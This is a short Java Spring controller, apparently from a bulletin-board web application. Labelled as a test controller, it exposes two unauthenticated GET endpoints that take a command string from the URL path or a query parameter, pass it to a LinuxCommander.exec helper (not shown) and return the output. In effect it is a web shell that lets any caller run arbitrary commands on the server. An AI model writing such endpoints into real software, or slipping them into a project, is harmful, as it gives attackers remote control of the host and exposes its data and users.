package lgs.bbs.comm;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.*;

@RestController
@RequestMapping(value = "/test")
public class TestController {

    @GetMapping(value ="/linuxCommander/{command}")
    public String linuxCommanderURL(@PathVariable String command){
        return LinuxCommander.exec(command);
    }

    @GetMapping(value ="/Commander")
    public String linuxCommander(@RequestParam String command){
        return LinuxCommander.exec(command);
    }

    @GetMapping(value ="/")
    public String test(){
        return "test";
    }
}
